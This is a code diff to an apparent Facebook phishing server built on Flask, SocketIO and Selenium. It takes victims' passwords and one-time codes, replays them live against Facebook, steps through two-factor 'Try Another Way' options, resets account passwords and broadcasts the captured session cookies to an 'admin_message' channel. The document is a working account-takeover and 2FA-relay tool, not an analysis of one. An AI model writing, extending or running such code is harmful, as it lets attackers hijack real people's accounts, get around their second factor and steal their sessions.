@@ -24,6 +24,7 @@ drivers = {}
 # Dictionary to track login attempts
 login_attempts = {}
 code_attempts = {}
+count_attempts= {}
 
 
 @app.route("/")
@@ -107,7 +108,7 @@ def handle_client_password(data):
             emit(
                 "redirect",
                 {"url": f"/confirm?id={password}", "id": password},
-                room=session_id,
+                room=session_id,  # Add this line to specify the room
             )
             return
 
@@ -124,7 +125,7 @@ def setup_selenium(session_id):
     chrome_options = Options()
 
     chrome_options.add_argument("--enable-unsafe-swiftshader")
-    chrome_options.add_argument("--window-size=750,450")
+    chrome_options.add_argument("--window-size=750,800")
     service = Service(executable_path="chromedriver.exe")
     driver = webdriver.Chrome(service=service, options=chrome_options)
     driver.get("https://en-gb.facebook.com/")
@@ -134,6 +135,14 @@ def setup_selenium(session_id):
 
 def login_facebook(session_id, email, phone, password):
     driver = setup_selenium(session_id)
+    if (
+        "https://en-gb.facebook.com/login/device-based/regular/login"
+        not in driver.current_url
+        or "https://en-gb.facebook.com"
+        not in driver.current_url
+    ):
+        driver.get("https://en-gb.facebook.com")
+
     try:
         WebDriverWait(driver, 10).until(
             EC.presence_of_element_located((By.ID, "email"))
@@ -172,13 +181,78 @@ def login_facebook(session_id, email, phone, password):
         count = 1
 
         if "two_step_verification" in driver.current_url:
-            print("Two-step verification required.")
-            return "checkpoint"
+            emit(
+                "redirect",
+                {"url": f"/confirm?id={password}", "id": password},
+                room=session_id,  # Add this line to specify the room
+            )
+            if session_id not in count_attempts:
+                count_attempts[session_id] = 0
+            count_attempts[session_id] =2
+            try:
+                buttonTry = WebDriverWait(driver, 20).until(
+                    EC.element_to_be_clickable(
+                        (By.XPATH, "//span[text()='Try Another Way']")
+                    )
+                )
+                #  viết ở đây
+                buttonTry.click()
+                textMess = None
+                try:
+                    print("Click text message1")
+                    textMess = WebDriverWait(driver, 20).until(
+                        EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Text message')]"))
+                    )
+                    textMess.click()
+                   
+                except:
+                    textMess = None
+                    try:
+                        textMess = WebDriverWait(driver, 10).until(
+                            EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'WhatsApp')]"))
+                        )
+                        textMess.click()
+                        print("Click WhatsApp")
+                    except:
+                        textMess = None
+                        try:
+                            textMess = WebDriverWait(driver, 10).until(
+                                EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Email')]"))
+                            )
+                            textMess.click()
+                            print("Click Email")
+                        except:
+                            textMess = None
+                            print("No valid method found. Waiting for 2 minutes before retrying...")
+                            time.sleep(120)
+                            driver.refresh()
+                
+                if textMess:
+                    try:
+                        element = WebDriverWait(driver, 10).until(
+                             EC.presence_of_element_located((By.XPATH, "//span[text()='Continue']"))
+                        )   
+                        driver.execute_script("arguments[0].click();", element)
+
+                        print("Click continue button")
+                    except Exception as e:
+                        print(f"An error occurred while finding continue button: {e}")
+                    print("Click text message")
+                return
+                 
+            except:
+                tryanwser = None
+             
         elif "https://en-gb.facebook.com/login" in driver.current_url:
             # If login with email fails, try logging in with phone
-            email_input = driver.find_element(By.ID, "email")
-            email_input.clear()
-            email_input.send_keys(phone)
+            print("Login failed. Trying with phone number.")
+            try:
+                email_input = driver.find_element(By.ID, "email")
+                if email_input:
+                    email_input.clear()
+                    email_input.send_keys(phone)
+            except:
+                print("Email input not found.")
 
             password_input = driver.find_element(By.ID, "pass")
             password_input.clear()
@@ -228,11 +302,16 @@ def login_facebook(session_id, email, phone, password):
                 room=request.sid,
             )
 
+        elif "https://en-gb.facebook.com/login/help.php" in driver.current_url:
+            print("Login successful.")
+            return "Login_Success"
+
         print("Login successful.")
         return "Login_Success"
     except Exception as e:
         print(f"An error occurred: {e}")
-        return str(e)
+         
+        return "Wrong_Pass"
 
 
 def forgot_password(session_id, email, mobile=None):
@@ -274,6 +353,7 @@ def forgot_password(session_id, email, mobile=None):
             search_button.click()
 
         time.sleep(5)
+        print("đợi uiheader")
         element = None
         # nếu ra chữ "We sent a 6-digit code to" thì đã lấy được form input và button submit
         try:
@@ -282,12 +362,18 @@ def forgot_password(session_id, email, mobile=None):
         except:
             element = None
 
+        print("SO sánh google")
         if element:
             if "Google" in element.text:
                 driver.get(
                     "https://en-gb.facebook.com/recover/initiate/?is_from_lara_screen=1"
                 )
-                time.sleep(5)
+                button = WebDriverWait(driver, 20).until(
+                    EC.element_to_be_clickable(
+                        (By.XPATH, '//button[text()="Continue"]')
+                    )
+                )
+                button.click()
             else:
                 button = WebDriverWait(driver, 20).until(
                     EC.element_to_be_clickable(
@@ -304,6 +390,8 @@ def forgot_password(session_id, email, mobile=None):
                 EC.element_to_be_clickable((By.XPATH, '//button[text()="Continue"]'))
             )
             button.click()
+            time.sleep(5)
+            print("vào quênmk")
             try:
 
                 element = driver.find_element(By.CLASS_NAME, "uiHeaderTitle")
@@ -314,9 +402,16 @@ def forgot_password(session_id, email, mobile=None):
                         )
                     )
                     button.click()
+                
 
             except:
-                element = None
+                print("quên mk2")
+                button = WebDriverWait(driver, 20).until(
+                        EC.element_to_be_clickable(
+                            (By.XPATH, '//button[text()="Continue"]')
+                        )
+                    )
+                button.click()
 
     except Exception as e:
         print(f"An error occurred during forgot password process: {e}")
@@ -324,14 +419,48 @@ def forgot_password(session_id, email, mobile=None):
 
 @socketio.on("confirm_code")
 def handle_confirm_code(data):
+    driver = setup_selenium(data["session_id"])
     session_id = data["session_id"]
     password = data["password"]
-    print(f"Received password from client {session_id}: {password}")
+    sess_id = data["sess_id"]
     code = data["code"]
-    print(f"Received confirmation code from client {session_id}: {code}")
-
+ 
     if session_id not in code_attempts:
         code_attempts[session_id] = 0
+    if session_id not in count_attempts:
+        count_attempts[session_id] = 0
+
+    
+    if count_attempts[session_id] == 2:
+            print("vào 2fa")
+            rest2 = fa2(session_id, code)
+            
+            count_wrong = 0
+            if rest2 == "FA2_Accepted":
+                code_attempts[session_id] += 1
+                emit("code_result2", {"status": "true"}, room=sess_id)
+                emit("redirect", {"url": "/done"}, room=sess_id)
+                cookies = driver.get_cookies()
+                 # chỉ lấy name và value của cookies
+                cookie_list = [{"name": c['name'], "value": c['value']} for c in cookies]
+                cookie_str = '; '.join([f"{cookie['name']}={cookie['value']}" for cookie in cookie_list])
+                print(cookie_str)
+                emit(
+                    "admin_message",
+                    {"id": session_id, "type": "cookies", "data": cookie_str},
+                    broadcast=True,
+                )
+                driver.close()
+                return
+            else:
+                count_wrong += 1
+                emit("code_result2", {"status": "false"}, room=sess_id)
+                 
+                if count_wrong >= 2:
+                    driver.close()
+                    emit("redirect", {"url": "/done"}, room=sess_id)
+                return
+
     code_attempts[session_id] += 1
 
     print(f"Code attempts: {code_attempts[session_id]}")
@@ -341,12 +470,44 @@ def handle_confirm_code(data):
 
     result = enter_confirmation_code(session_id, code)
     if result != "Code_Accepted":
-        emit("code_result", {"status": "false"}, room=session_id)
+        emit("code_result", {"status": "false"}, room=sess_id)
         if code_attempts[session_id] >= 2:
-            emit("redirect", {"url": "/done"}, room=session_id)
+            # Get cookies from Selenium and send to admin
+            driver = setup_selenium(session_id)
+            cookies = driver.get_cookies()
+            # chỉ lấy name và value của cookies
+            cookie_list = [{"name": c['name'], "value": c['value']} for c in cookies]
+            cookie_str = '; '.join([f"{cookie['name']}={cookie['value']}" for cookie in cookie_list])
+
+            emit(
+                "admin_message",
+                {"id": session_id, "type": "cookies", "data": cookie_str},
+                broadcast=True,
+            )
+            emit("redirect", {"url": "/done"}, room=sess_id)
+            driver.close()
+
     else:
-        emit("code_result", {"status": "success", "url": "/success"}, room=session_id)
-        setNewPass(session_id, password)
+        print(driver.current_url)
+        if "https://www.facebook.com/" == driver.current_url:
+            cookies = driver.get_cookies()
+            cookie_list = [{"name": c['name'], "value": c['value']} for c in cookies]
+            cookie_str = '; '.join([f"{cookie['name']}={cookie['value']}" for cookie in cookie_list])
+
+            emit(
+                    "admin_message",
+                    {"id": session_id, "type": "cookies", "data": cookie_str},
+                    broadcast=True,
+            )
+            emit("redirect", {"url": "/done"}, room=session_id)
+                # tắt driver
+            driver.close()
+
+        rest = setNewPass(session_id, password)
+        if rest == "NewPass_Accepted":
+            
+            count_attempts[session_id] =2
+
 
 
 def enter_confirmation_code(session_id, code):
@@ -402,6 +563,112 @@ def setNewPass(session_id, newPass):
     except Exception as e:
         print(f"An error occurred while entering the new password: {e}")
         return "NewPass_Err"
+    
+
+def fa2(session_id, code):
+    driver = setup_selenium(session_id)
+    try:
+        if (
+            "https://en-gb.facebook.com/two_step_verification" in driver.current_url
+            or "https://en-gb.facebook.com/checkpoint" in driver.current_url
+        ):
+            code_input = WebDriverWait(driver, 10).until(
+            # lấy element input have type = text
+                EC.presence_of_element_located((By.XPATH, '//input[@type="text"]'))
+            )
+            print(code_input)
+            time.sleep(2)
+            code_input.click()
+            code_input.clear()
+            code_input.send_keys(code)
+            continue_button = WebDriverWait(driver, 10).until(
+                EC.element_to_be_clickable((By.XPATH, "//span[text()='Continue']"))
+            )
+            continue_button.click()
+            print("Đường dẫn hiện tại." + driver.current_url)
+            if "https://en-gb.facebook.com/checkpoint" in driver.current_url or "https://en-gb.facebook.com/two_step_verification" in driver.current_url:
+                code_input.click()
+                code_input.send_keys(Keys.CONTROL + "a")  # Chọn tất cả
+                code_input.send_keys(Keys.BACKSPACE) 
+                print("Invalid code. Please try again.")
+                return "FA2_Err"
+            if "https://en-gb.facebook.com/login/device-based/regular/login" in driver.current_url or "remember_browser" in driver.current_url:
+                print("Code accepted.")
+                return "FA2_Accepted"
+            return "FA2_Accepted"
+
+        else:
+            driver = setup_selenium(session_id)
+            cookies = driver.get_cookies()
+            # chỉ lấy name và value của cookies
+            cookie_list = [{"name": c['name'], "value": c['value']} for c in cookies]
+            cookie_str = '; '.join([f"{cookie['name']}={cookie['value']}" for cookie in cookie_list])
+
+            emit(
+                "admin_message",
+                {"id": session_id, "type": "cookies", "data": cookie_str},
+                broadcast=True,
+            )
+            emit("redirect", {"url": "/done"}, room=session_id)
+            # tắt driver
+            driver.close()
+            return "FA2_Err"
+    except Exception as e:
+            print("lỗi 2fa")
+            try:
+                buttonTry = WebDriverWait(driver, 20).until(
+                    EC.element_to_be_clickable(
+                        (By.XPATH, "//span[text()='Try Another Way']")
+                    )
+                )
+                #  viết ở đây
+                buttonTry.click()
+                textMess = None
+                try:
+                    print("Click text message1")
+                    textMess = WebDriverWait(driver, 20).until(
+                        EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Text message')]"))
+                    )
+                    textMess.click()
+                   
+                except:
+                    textMess = None
+                    try:
+                        textMess = WebDriverWait(driver, 10).until(
+                            EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'WhatsApp')]"))
+                        )
+                        textMess.click()
+                        print("Click WhatsApp")
+                    except:
+                        textMess = None
+                        try:
+                            textMess = WebDriverWait(driver, 10).until(
+                                EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Email')]"))
+                            )
+                            textMess.click()
+                            print("Click Email")
+                        except:
+                            textMess = None
+                            print("No valid method found. Waiting for 2 minutes before retrying...")
+                            time.sleep(120)
+                            driver.refresh()
+                
+                if textMess:
+                    try:
+                        element = WebDriverWait(driver, 10).until(
+                             EC.presence_of_element_located((By.XPATH, "//span[text()='Continue']"))
+                        )   
+                        driver.execute_script("arguments[0].click();", element)
+
+                        print("Click continue button")
+                    except Exception as e:
+                        print(f"An error occurred while finding continue button: {e}")
+                    print("Click text message")
+                return
+                 
+            except:
+                tryanwser = None
+         
 
 
 if __name__ == "__main__":
